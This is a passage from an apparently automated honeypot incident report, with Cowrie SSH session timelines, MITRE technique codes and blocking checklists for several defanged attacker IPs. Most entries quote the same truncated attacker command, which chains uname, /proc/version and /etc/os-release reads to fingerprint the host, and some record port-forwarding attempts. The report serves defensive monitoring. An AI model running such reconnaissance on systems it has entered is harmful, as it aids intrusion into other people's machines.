| `2026-07-24 18:34:17` | `cowrie.command.success` |
| `2026-07-24 18:34:17` | `cowrie.command.input` |
| `2026-07-24 18:34:17` | `cowrie.command.input` |
| `2026-07-24 18:34:17` | `cowrie.command.input` |
| `2026-07-24 18:34:17` | `cowrie.command.input` |
| `2026-07-24 18:34:17` | `cowrie.log.closed` |
| `2026-07-24 18:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9d6aa4b03d5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:35 |
| **Last Seen** | 2026-07-24 18:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:35:34` | `cowrie.session.connect` |
| `2026-07-24 18:35:35` | `cowrie.client.version` |
| `2026-07-24 18:35:35` | `cowrie.client.kex` |
| `2026-07-24 18:35:37` | `cowrie.login.success` |
| `2026-07-24 18:35:38` | `cowrie.session.params` |
| `2026-07-24 18:35:38` | `cowrie.command.input` |
| `2026-07-24 18:35:38` | `cowrie.command.input` |
| `2026-07-24 18:35:38` | `cowrie.command.input` |
| `2026-07-24 18:35:38` | `cowrie.command.input` |
| `2026-07-24 18:35:38` | `cowrie.command.input` |
| `2026-07-24 18:35:38` | `cowrie.command.success` |
| `2026-07-24 18:35:38` | `cowrie.command.input` |
| `2026-07-24 18:35:38` | `cowrie.command.input` |
| `2026-07-24 18:35:38` | `cowrie.command.input` |
| `2026-07-24 18:35:38` | `cowrie.command.input` |
| `2026-07-24 18:35:39` | `cowrie.log.closed` |
| `2026-07-24 18:35:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7535af965239

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:35 |
| **Last Seen** | 2026-07-24 18:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:35:44` | `cowrie.session.connect` |
| `2026-07-24 18:35:44` | `cowrie.client.version` |
| `2026-07-24 18:35:44` | `cowrie.client.kex` |
| `2026-07-24 18:35:46` | `cowrie.login.success` |
| `2026-07-24 18:35:47` | `cowrie.session.params` |
| `2026-07-24 18:35:47` | `cowrie.command.input` |
| `2026-07-24 18:35:47` | `cowrie.command.input` |
| `2026-07-24 18:35:47` | `cowrie.command.input` |
| `2026-07-24 18:35:47` | `cowrie.command.input` |
| `2026-07-24 18:35:47` | `cowrie.command.input` |
| `2026-07-24 18:35:47` | `cowrie.command.success` |
| `2026-07-24 18:35:47` | `cowrie.command.input` |
| `2026-07-24 18:35:47` | `cowrie.command.input` |
| `2026-07-24 18:35:47` | `cowrie.command.input` |
| `2026-07-24 18:35:47` | `cowrie.command.input` |
| `2026-07-24 18:35:48` | `cowrie.log.closed` |
| `2026-07-24 18:35:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81c245ecf7da

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:36 |
| **Last Seen** | 2026-07-24 18:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:36:47` | `cowrie.session.connect` |
| `2026-07-24 18:36:47` | `cowrie.client.version` |
| `2026-07-24 18:36:47` | `cowrie.client.kex` |
| `2026-07-24 18:36:49` | `cowrie.login.success` |
| `2026-07-24 18:36:50` | `cowrie.session.params` |
| `2026-07-24 18:36:50` | `cowrie.command.input` |
| `2026-07-24 18:36:50` | `cowrie.command.input` |
| `2026-07-24 18:36:50` | `cowrie.command.input` |
| `2026-07-24 18:36:50` | `cowrie.command.input` |
| `2026-07-24 18:36:50` | `cowrie.command.input` |
| `2026-07-24 18:36:50` | `cowrie.command.success` |
| `2026-07-24 18:36:50` | `cowrie.command.input` |
| `2026-07-24 18:36:50` | `cowrie.command.input` |
| `2026-07-24 18:36:50` | `cowrie.command.input` |
| `2026-07-24 18:36:50` | `cowrie.command.input` |
| `2026-07-24 18:36:51` | `cowrie.log.closed` |
| `2026-07-24 18:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e965462040bc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:37 |
| **Last Seen** | 2026-07-24 18:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:37:26` | `cowrie.session.connect` |
| `2026-07-24 18:37:27` | `cowrie.client.version` |
| `2026-07-24 18:37:27` | `cowrie.client.kex` |
| `2026-07-24 18:37:28` | `cowrie.login.success` |
| `2026-07-24 18:37:29` | `cowrie.session.params` |
| `2026-07-24 18:37:29` | `cowrie.command.input` |
| `2026-07-24 18:37:29` | `cowrie.command.input` |
| `2026-07-24 18:37:29` | `cowrie.command.input` |
| `2026-07-24 18:37:29` | `cowrie.command.input` |
| `2026-07-24 18:37:29` | `cowrie.command.input` |
| `2026-07-24 18:37:29` | `cowrie.command.success` |
| `2026-07-24 18:37:29` | `cowrie.command.input` |
| `2026-07-24 18:37:29` | `cowrie.command.input` |
| `2026-07-24 18:37:29` | `cowrie.command.input` |
| `2026-07-24 18:37:29` | `cowrie.command.input` |
| `2026-07-24 18:37:30` | `cowrie.log.closed` |
| `2026-07-24 18:37:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edf778815ed2

| Field | Detail |
|---|---|
| **Source IP** | `220.178.246[.]43` |
| **First Seen** | 2026-07-24 18:37 |
| **Last Seen** | 2026-07-24 18:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:37:30` | `cowrie.session.connect` |
| `2026-07-24 18:37:31` | `cowrie.client.version` |
| `2026-07-24 18:37:31` | `cowrie.client.kex` |
| `2026-07-24 18:37:33` | `cowrie.login.success` |
| `2026-07-24 18:37:33` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:37:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.246[.]43` to AbuseIPDB if not already reported
- [ ] Block `220.178.246[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dca7aa92e7dc

| Field | Detail |
|---|---|
| **Source IP** | `223.99.212[.]58` |
| **First Seen** | 2026-07-24 18:37 |
| **Last Seen** | 2026-07-24 18:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:37:39` | `cowrie.session.connect` |
| `2026-07-24 18:37:40` | `cowrie.client.version` |
| `2026-07-24 18:37:40` | `cowrie.client.kex` |
| `2026-07-24 18:37:41` | `cowrie.login.success` |
| `2026-07-24 18:37:42` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.99.212[.]58` to AbuseIPDB if not already reported
- [ ] Block `223.99.212[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c33257b79b6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:37 |
| **Last Seen** | 2026-07-24 18:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:37:59` | `cowrie.session.connect` |
| `2026-07-24 18:37:59` | `cowrie.client.version` |
| `2026-07-24 18:37:59` | `cowrie.client.kex` |
| `2026-07-24 18:38:00` | `cowrie.login.success` |
| `2026-07-24 18:38:02` | `cowrie.session.params` |
| `2026-07-24 18:38:02` | `cowrie.command.input` |
| `2026-07-24 18:38:02` | `cowrie.command.input` |
| `2026-07-24 18:38:02` | `cowrie.command.input` |
| `2026-07-24 18:38:02` | `cowrie.command.input` |
| `2026-07-24 18:38:02` | `cowrie.command.input` |
| `2026-07-24 18:38:02` | `cowrie.command.success` |
| `2026-07-24 18:38:02` | `cowrie.command.input` |
| `2026-07-24 18:38:02` | `cowrie.command.input` |
| `2026-07-24 18:38:02` | `cowrie.command.input` |
| `2026-07-24 18:38:02` | `cowrie.command.input` |
| `2026-07-24 18:38:02` | `cowrie.log.closed` |
| `2026-07-24 18:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-172c45bfad9b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:39 |
| **Last Seen** | 2026-07-24 18:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:39:11` | `cowrie.session.connect` |
| `2026-07-24 18:39:11` | `cowrie.client.version` |
| `2026-07-24 18:39:11` | `cowrie.client.kex` |
| `2026-07-24 18:39:12` | `cowrie.login.success` |
| `2026-07-24 18:39:13` | `cowrie.session.params` |
| `2026-07-24 18:39:13` | `cowrie.command.input` |
| `2026-07-24 18:39:13` | `cowrie.command.input` |
| `2026-07-24 18:39:13` | `cowrie.command.input` |
| `2026-07-24 18:39:13` | `cowrie.command.input` |
| `2026-07-24 18:39:13` | `cowrie.command.input` |
| `2026-07-24 18:39:13` | `cowrie.command.success` |
| `2026-07-24 18:39:13` | `cowrie.command.input` |
| `2026-07-24 18:39:13` | `cowrie.command.input` |
| `2026-07-24 18:39:13` | `cowrie.command.input` |
| `2026-07-24 18:39:13` | `cowrie.command.input` |
| `2026-07-24 18:39:14` | `cowrie.log.closed` |
| `2026-07-24 18:39:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48130a25e7f5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:39 |
| **Last Seen** | 2026-07-24 18:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:39:11` | `cowrie.session.connect` |
| `2026-07-24 18:39:11` | `cowrie.client.version` |
| `2026-07-24 18:39:11` | `cowrie.client.kex` |
| `2026-07-24 18:39:12` | `cowrie.login.success` |
| `2026-07-24 18:39:14` | `cowrie.session.params` |
| `2026-07-24 18:39:14` | `cowrie.command.input` |
| `2026-07-24 18:39:14` | `cowrie.command.input` |
| `2026-07-24 18:39:14` | `cowrie.command.input` |
| `2026-07-24 18:39:14` | `cowrie.command.input` |
| `2026-07-24 18:39:14` | `cowrie.command.input` |
| `2026-07-24 18:39:14` | `cowrie.command.success` |
| `2026-07-24 18:39:14` | `cowrie.command.input` |
| `2026-07-24 18:39:14` | `cowrie.command.input` |
| `2026-07-24 18:39:14` | `cowrie.command.input` |
| `2026-07-24 18:39:14` | `cowrie.command.input` |
| `2026-07-24 18:39:14` | `cowrie.log.closed` |
| `2026-07-24 18:39:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44cf9daaa5ed

| Field | Detail |
|---|---|
| **Source IP** | `36.64.36[.]101` |
| **First Seen** | 2026-07-24 18:39 |
| **Last Seen** | 2026-07-24 18:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:39:40` | `cowrie.session.connect` |
| `2026-07-24 18:39:40` | `cowrie.client.version` |
| `2026-07-24 18:39:40` | `cowrie.client.kex` |
| `2026-07-24 18:39:42` | `cowrie.login.success` |
| `2026-07-24 18:39:43` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.36[.]101` to AbuseIPDB if not already reported
- [ ] Block `36.64.36[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db995fcb0db1

| Field | Detail |
|---|---|
| **Source IP** | `196.216.81[.]126` |
| **First Seen** | 2026-07-24 18:39 |
| **Last Seen** | 2026-07-24 18:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:39:48` | `cowrie.session.connect` |
| `2026-07-24 18:39:49` | `cowrie.client.version` |
| `2026-07-24 18:39:49` | `cowrie.client.kex` |
| `2026-07-24 18:39:51` | `cowrie.login.success` |
| `2026-07-24 18:39:52` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:39:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.216.81[.]126` to AbuseIPDB if not already reported
- [ ] Block `196.216.81[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09be932c6a7f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:40 |
| **Last Seen** | 2026-07-24 18:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:40:25` | `cowrie.session.connect` |
| `2026-07-24 18:40:26` | `cowrie.client.version` |
| `2026-07-24 18:40:26` | `cowrie.client.kex` |
| `2026-07-24 18:40:27` | `cowrie.login.success` |
| `2026-07-24 18:40:28` | `cowrie.session.params` |
| `2026-07-24 18:40:28` | `cowrie.command.input` |
| `2026-07-24 18:40:28` | `cowrie.command.input` |
| `2026-07-24 18:40:28` | `cowrie.command.input` |
| `2026-07-24 18:40:28` | `cowrie.command.input` |
| `2026-07-24 18:40:28` | `cowrie.command.input` |
| `2026-07-24 18:40:28` | `cowrie.command.success` |
| `2026-07-24 18:40:28` | `cowrie.command.input` |
| `2026-07-24 18:40:28` | `cowrie.command.input` |
| `2026-07-24 18:40:28` | `cowrie.command.input` |
| `2026-07-24 18:40:28` | `cowrie.command.input` |
| `2026-07-24 18:40:28` | `cowrie.log.closed` |
| `2026-07-24 18:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f31b94e699b0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:40 |
| **Last Seen** | 2026-07-24 18:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:40:55` | `cowrie.session.connect` |
| `2026-07-24 18:40:55` | `cowrie.client.version` |
| `2026-07-24 18:40:55` | `cowrie.client.kex` |
| `2026-07-24 18:40:56` | `cowrie.login.success` |
| `2026-07-24 18:40:58` | `cowrie.session.params` |
| `2026-07-24 18:40:58` | `cowrie.command.input` |
| `2026-07-24 18:40:58` | `cowrie.command.input` |
| `2026-07-24 18:40:58` | `cowrie.command.input` |
| `2026-07-24 18:40:58` | `cowrie.command.input` |
| `2026-07-24 18:40:58` | `cowrie.command.input` |
| `2026-07-24 18:40:58` | `cowrie.command.success` |
| `2026-07-24 18:40:58` | `cowrie.command.input` |
| `2026-07-24 18:40:58` | `cowrie.command.input` |
| `2026-07-24 18:40:58` | `cowrie.command.input` |
| `2026-07-24 18:40:58` | `cowrie.command.input` |
| `2026-07-24 18:40:58` | `cowrie.log.closed` |
| `2026-07-24 18:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b1794fb77e6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:41 |
| **Last Seen** | 2026-07-24 18:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:41:40` | `cowrie.session.connect` |
| `2026-07-24 18:41:41` | `cowrie.client.version` |
| `2026-07-24 18:41:41` | `cowrie.client.kex` |
| `2026-07-24 18:41:42` | `cowrie.login.success` |
| `2026-07-24 18:41:43` | `cowrie.session.params` |
| `2026-07-24 18:41:43` | `cowrie.command.input` |
| `2026-07-24 18:41:43` | `cowrie.command.input` |
| `2026-07-24 18:41:43` | `cowrie.command.input` |
| `2026-07-24 18:41:43` | `cowrie.command.input` |
| `2026-07-24 18:41:43` | `cowrie.command.input` |
| `2026-07-24 18:41:43` | `cowrie.command.success` |
| `2026-07-24 18:41:43` | `cowrie.command.input` |
| `2026-07-24 18:41:43` | `cowrie.command.input` |
| `2026-07-24 18:41:43` | `cowrie.command.input` |
| `2026-07-24 18:41:43` | `cowrie.command.input` |
| `2026-07-24 18:41:43` | `cowrie.log.closed` |
| `2026-07-24 18:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
